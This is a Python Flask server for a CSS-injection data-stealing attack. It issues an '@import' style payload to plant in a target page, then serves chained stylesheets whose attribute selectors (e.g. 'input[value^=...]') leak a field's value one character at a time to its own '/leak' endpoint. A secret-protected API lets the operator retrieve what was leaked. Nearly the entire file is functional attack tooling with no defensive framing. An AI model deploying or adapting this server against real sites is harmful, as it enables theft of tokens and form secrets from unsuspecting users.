import os, threading, string
from flask import *

app = Flask(__name__)
app.data = {}
app.api_secret = os.urandom(16).hex()

@app.route('/<key>/leak/<leaked>')
def leak(key, leaked):
    if key not in app.data:
        return '', 404
    app.data[key]['leaked'] = leaked
    app.data[key]['event'].set()
    app.data[key]['event'].clear()
    return '', 200, {'Content-Type': 'image/gif'}

@app.route('/<key>/<int:index>/stage2.css')
def stage2(key, index):
    if key not in app.data:
        return '', 404
    if app.data[key]['event'].wait(timeout=10) == False:
        app.data[key]['run'] = False
        return ''
    return render_template('stage.jinja2', key=key, index=index, data=app.data[key]), 200, {'Content-Type': 'text/css'}

@app.route('/<key>/stage1.css')
def stage1(key):
    if key not in app.data:
        return '', 404
    app.data[key]['event'] = threading.Event()
    app.data[key]['run'] = True
    return render_template('stage.jinja2', key=key, index=0, data=app.data[key]), 200, {'Content-Type': 'text/css'}

@app.route('/<api_secret>/set')
def api_set(api_secret):
    if api_secret != app.api_secret:
        return '', 404
    chars = request.form['c'] if 'c' in request.form else string.ascii_letters + string.digits
    selector = request.form['s'] if 's' in request.form else 'input[value^="{leaked}"]'
    key = request.form['key'] if 'key' in request.form else os.urandom(16).hex()
    app.data[key] = {'chars': chars, 'selector': selector, 'run': False, 'leaked': ''}
    return jsonify({
        'key': key,
        'payload': '<style>@import\'{}\';</style>'.format(url_for('stage1', key=key, _external=True))
    })

@app.route('/<api_secret>/get/<key>')
def api_get(api_secret, key):
    if api_secret != app.api_secret:
        return '', 404
    if key not in app.data:
        return jsonify({'message': 'not found key "{}"'.format(key)})
    return jsonify({'run': app.data[key]['run'], 'leaked': app.data[key]['leaked']})

@app.route('/<api_secret>/gets')
def api_gets(api_secret):
    if api_secret != app.api_secret:
        return '', 404
    return jsonify(list(app.data.keys()))

@app.route('/test')
def test():
    if app.debug != True:
        return '', 404
    secret = os.urandom(16).hex()
    return render_template('test.jinja2', secret=secret, payload=request.args.get('payload'))

if __name__ == '__main__':
    print('[+] api_sercet: {}'.format(app.api_secret))
    app.run(threaded=True)
